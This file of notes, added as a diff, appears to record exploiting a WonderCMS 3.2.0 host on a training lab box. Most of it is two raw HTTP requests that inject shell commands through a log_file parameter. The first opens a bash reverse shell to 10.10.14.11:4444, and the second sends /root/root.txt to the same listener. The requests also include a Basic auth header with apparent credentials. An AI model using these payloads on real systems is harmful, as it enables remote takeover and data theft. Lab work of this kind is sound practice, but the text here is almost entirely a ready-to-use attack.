@@ -1,0 +1,66 @@
+
+
+
+Website is vuln to wondercms 3.2.0
+CVE-2023-41425 (WonderCMS Remote Code Execution)
+
+
+
+
+
+
+
+POST / HTTP/1.1
+Host: localhost:8080
+Content-Length: 103
+Cache-Control: max-age=0
+Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
+sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: http://localhost:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost:8080/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alivot/e
+
+log_file=%2Fvar%2Flog%2Fapache2%2F;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.11/4444+0>%261'&analyze_log=
+
+
+
+
+couldnt get a stable shell. lvvp helped extend the duration slightly. but regardless.
+went for the direct cat root to listener method
+
+
+POST / HTTP/1.1
+Host: localhost:8080
+Content-Length: 114
+Cache-Control: max-age=0
+Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
+sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: http://localhost:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost:8080/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alivot/e
+
+log_file=%2Fvar%2Flog%2Fapache2%2F;bash+-c+'cat+/root/root.txt+>%26+/dev/tcp/10.10.14.11/4444+0>%261'&analyze_log=
